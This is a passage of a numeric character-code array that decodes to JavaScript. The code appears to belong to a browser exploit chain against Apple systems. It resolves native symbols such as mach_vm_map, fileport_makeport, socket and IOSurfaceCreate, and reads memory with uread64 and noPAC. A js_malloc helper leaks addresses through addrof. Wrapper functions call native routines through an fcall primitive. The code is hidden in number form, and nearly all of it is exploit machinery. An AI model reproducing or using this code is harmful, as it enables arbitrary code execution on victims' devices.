114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 99, 110, 116, 108, 34, 41, 59, 10, 108, 101, 116, 32, 70, 83, 89, 78, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 115, 121, 110, 99, 34, 41, 59, 10, 108, 101, 116, 32, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 70, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 102, 100, 34, 41, 59, 10, 108, 101, 116, 32, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 80, 79, 82, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 112, 111, 114, 116, 34, 41, 59, 10, 108, 101, 116, 32, 70, 79, 80, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 111, 112, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 70, 67, 76, 79, 83, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 99, 108, 111, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 70, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 83, 79, 67, 75, 79, 80, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 115, 111, 99, 107, 111, 112, 116, 34, 41, 59, 10, 108, 101, 116, 32, 76, 83, 69, 69, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 108, 115, 101, 101, 107, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 77, 69, 77, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 109, 101, 109, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 83, 69, 84, 95, 80, 65, 84, 84, 69, 82, 78, 56, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 115, 101, 116, 95, 112, 97, 116, 116, 101, 114, 110, 56, 34, 41, 59, 10, 108, 101, 116, 32, 79, 80, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 112, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 69, 65, 68, 86, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 101, 97, 100, 118, 34, 41, 59, 10, 108, 101, 116, 32, 80, 87, 82, 73, 84, 69, 86, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 119, 114, 105, 116, 101, 118, 34, 41, 59, 10, 108, 101, 116, 32, 80, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 69, 65, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 101, 97, 100, 34, 41, 59, 10, 108, 101, 116, 32, 82, 69, 65, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 114, 101, 97, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 69, 84, 83, 79, 67, 75, 79, 80, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 101, 116, 115, 111, 99, 107, 111, 112, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 79, 67, 75, 69, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 111, 99, 107, 101, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 65, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 97, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 83, 84, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 115, 116, 114, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 76, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 108, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 78, 67, 77, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 110, 99, 109, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 82, 67, 72, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 114, 99, 104, 114, 34, 41, 59, 10, 108, 101, 116, 32, 80, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 34, 41, 59, 10, 108, 101, 116, 32, 80, 84, 72, 82, 69, 65, 68, 95, 74, 79, 73, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 34, 41, 59, 10, 108, 101, 116, 32, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 82, 69, 77, 79, 86, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 114, 101, 109, 111, 118, 101, 34, 41, 59, 10, 108, 101, 116, 32, 65, 82, 67, 52, 82, 65, 78, 68, 79, 77, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 97, 114, 99, 52, 114, 97, 110, 100, 111, 109, 34, 41, 59, 10, 108, 101, 116, 32, 84, 65, 83, 75, 95, 84, 72, 82, 69, 65, 68, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 116, 97, 115, 107, 95, 116, 104, 114, 101, 97, 100, 115, 34, 41, 59, 10, 108, 101, 116, 32, 84, 72, 82, 69, 65, 68, 95, 83, 85, 83, 80, 69, 78, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 116, 104, 114, 101, 97, 100, 95, 115, 117, 115, 112, 101, 110, 100, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 77, 65, 75, 69, 95, 77, 69, 77, 79, 82, 89, 95, 69, 78, 84, 82, 89, 95, 54, 52, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 109, 97, 107, 101, 95, 109, 101, 109, 111, 114, 121, 95, 101, 110, 116, 114, 121, 95, 54, 52, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 77, 65, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 34, 41, 59, 10, 108, 101, 116, 32, 77, 77, 65, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 109, 97, 112, 34, 41, 59, 10, 108, 101, 116, 32, 77, 76, 79, 67, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 108, 111, 99, 107, 34, 41, 59, 10, 108, 101, 116, 32, 77, 85, 78, 76, 79, 67, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 117, 110, 108, 111, 99, 107, 34, 41, 59, 10, 108, 101, 116, 32, 85, 78, 65, 77, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 117, 110, 97, 109, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 67, 82, 69, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 67, 114, 101, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 80, 82, 69, 70, 69, 84, 67, 72, 80, 65, 71, 69, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 80, 114, 101, 102, 101, 116, 99, 104, 80, 97, 103, 101, 115, 34, 41, 59, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 71, 69, 84, 66, 65, 83, 69, 65, 68, 68, 82, 69, 83, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 71, 101, 116, 66, 97, 115, 101, 65, 100, 100, 114, 101, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 107, 73, 79, 83, 117, 114, 102, 97, 99, 101, 65, 108, 108, 111, 99, 83, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 73, 79, 83, 117, 114, 102, 97, 99, 101, 65, 108, 108, 111, 99, 83, 105, 122, 101, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 68, 85, 77, 80, 40, 97, 100, 100, 114, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 47, 47, 32, 102, 99, 97, 108, 108, 40, 108, 111, 99, 97, 108, 95, 100, 117, 109, 112, 44, 32, 97, 100, 100, 114, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 109, 97, 108, 108, 111, 99, 40, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 98, 117, 102, 102, 32, 61, 32, 110, 101, 119, 32, 85, 105, 110, 116, 56, 65, 114, 114, 97, 121, 40, 66, 105, 103, 73, 110, 116, 40, 115, 122, 41, 46, 97, 115, 73, 110, 116, 51, 50, 115, 41, 46, 102, 105, 108, 108, 40, 48, 120, 48, 48, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 117, 114, 101, 97, 100, 54, 52, 40, 109, 101, 109, 46, 97, 100, 100, 114, 111, 102, 40, 98, 117, 102, 102, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 115, 112, 101, 99, 105, 102, 105, 99, 40, 107, 101, 121, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 71, 69, 84, 83, 80, 69, 67, 73, 70, 73, 67, 44, 32, 107, 101, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 40, 116, 104, 114, 44, 32, 118, 97, 108, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 74, 79, 73, 78, 44, 32, 116, 104, 114, 44, 32, 118, 97, 108, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 95, 78, 83, 71, 101, 116, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 80, 97, 116, 104, 40, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 112, 97, 116, 104, 44, 32, 108, 101, 110, 103, 116, 104, 95, 112, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 95, 78, 83, 71, 69, 84, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 80, 65, 84, 72, 44, 32, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 112, 97, 116, 104, 44, 32, 108, 101, 110, 103, 116, 104, 95, 112, 116, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 111, 110, 102, 115, 116, 114, 40, 110, 97, 109, 101, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 79, 78, 70, 83, 84, 82, 44, 32, 110, 97, 109, 101, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 114, 99, 104, 114, 40, 115, 44, 32, 99, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 82, 67, 72, 82, 44, 32, 115, 44, 32, 99, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 97, 116, 40, 115, 49, 44, 32, 115, 50, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 65, 84, 44, 32, 115, 49, 44, 32, 115, 50, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 108, 101, 110, 40, 115, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 76, 69, 78, 44, 32, 115, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 115, 116, 114, 40, 115, 49, 44, 32, 115, 50, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 83, 84, 82, 44, 32, 115, 49, 44, 32, 115, 50, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 110, 99, 109, 112, 40, 115, 49, 44, 32, 115, 50, 44, 32, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 78, 67, 77, 80, 44, 32, 115, 49, 44, 32, 115, 50, 44, 32, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 111, 99, 107, 101, 116, 40, 100, 111, 109, 97, 105, 110, 44, 32, 116, 121, 112, 101, 44, 32, 112, 114, 111, 116, 111, 99, 111, 108, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 79, 67, 75, 69, 84, 44, 32, 100, 111, 109, 97, 105, 110, 44, 32, 116, 121, 112, 101, 44, 32, 112, 114, 111, 116, 111, 99, 111, 108, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 115, 111, 99, 107, 111, 112, 116, 40, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 83, 79, 67, 75, 79, 80, 84, 44, 32, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 115, 111, 99, 107, 111, 112, 116, 40, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 69, 84, 83, 79, 67, 75, 79, 80, 84, 44, 32, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 112, 111, 114, 116, 40, 102, 100, 44, 32, 112, 111, 114, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 80, 79, 82, 84, 44, 32, 102, 100, 44, 32, 112, 111, 114, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 102, 100, 40, 112, 111, 114, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 70, 68, 44, 32, 112, 111, 114, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 115, 101, 116, 95, 112, 97, 116, 116, 101, 114, 110, 56, 40, 98, 117, 102, 44, 32, 118, 97, 108, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 83, 69, 84, 95, 80, 65, 84, 84, 69, 82, 78, 56, 44, 32, 98, 117, 102, 44, 32, 118, 97, 108, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 109, 101, 109, 40, 98, 105, 103, 44, 32, 98, 105, 103, 95, 108, 101, 110, 44, 32, 108, 105, 116, 116, 108, 101, 44, 32, 108, 105, 116, 116, 108, 101, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 77, 69, 77, 44, 32, 98, 105, 103, 44, 32, 98, 105, 103, 95, 108, 101, 110, 44, 32, 108, 105, 116, 116, 108, 101, 44, 32, 108, 105, 116, 116, 108, 101, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 99, 99, 101, 115, 115, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 65, 67, 67, 69, 83, 83, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 112, 101, 110, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 80, 69, 78, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 111, 112, 101, 110, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 79, 80, 69, 78, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 99, 108, 111, 115, 101, 40, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 67, 76, 79, 83, 69, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 119, 114, 105, 116, 101, 40, 98, 117, 102, 44, 32, 115, 122, 44, 32, 110, 105, 116, 101, 109, 44, 32, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 87, 82, 73, 84, 69, 44, 32, 98, 117, 102, 44, 32, 115, 122, 44, 32, 110, 105, 116, 101, 109, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 101, 97, 100, 118, 40, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 69, 65, 68, 86, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 119, 114, 105, 116, 101, 118, 40, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 87, 82, 73, 84, 69, 86, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 119, 114, 105, 116, 101, 40, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 87, 82, 73, 84, 69, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 101, 97, 100, 40, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 69, 65, 68, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 114, 101, 97, 100, 40, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 82, 69, 65, 68, 44, 32, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 119, 114, 105, 116, 101, 40, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 87, 82, 73, 84, 69, 44, 32, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 114, 101, 109, 111, 118, 101, 40, 112, 97, 116, 104, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 82, 69, 77, 79, 86, 69, 44, 32, 112, 97, 116, 104, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 114, 99, 52, 114, 97, 110, 100, 111, 109, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 65, 82, 67, 52, 82, 65, 78, 68, 79, 77, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 116, 97, 115, 107, 95, 116, 104, 114, 101, 97, 100, 115, 40, 116, 97, 115, 107, 44, 32, 116, 104, 114, 101, 97, 100, 95, 108, 105, 115, 116, 95, 97, 100, 100, 114, 44, 32, 116, 104, 114, 101, 97, 100, 95, 99, 111, 117, 110, 116, 95, 97, 100, 100, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 84, 65, 83, 75, 95, 84, 72, 82, 69, 65, 68, 83, 44, 32, 116, 97, 115, 107, 44, 32, 116, 104, 114, 101, 97, 100, 95, 108, 105, 115, 116, 95, 97, 100, 100, 114, 44, 32, 116, 104, 114, 101, 97, 100, 95, 99, 111, 117, 110, 116, 95, 97, 100, 100, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 99, 110, 116, 108, 40, 102, 100, 44, 32, 102, 108, 97, 103, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 67, 78, 84, 76, 44, 32, 102, 100, 44, 32, 102, 108, 97, 103, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 118, 97, 108, 117, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 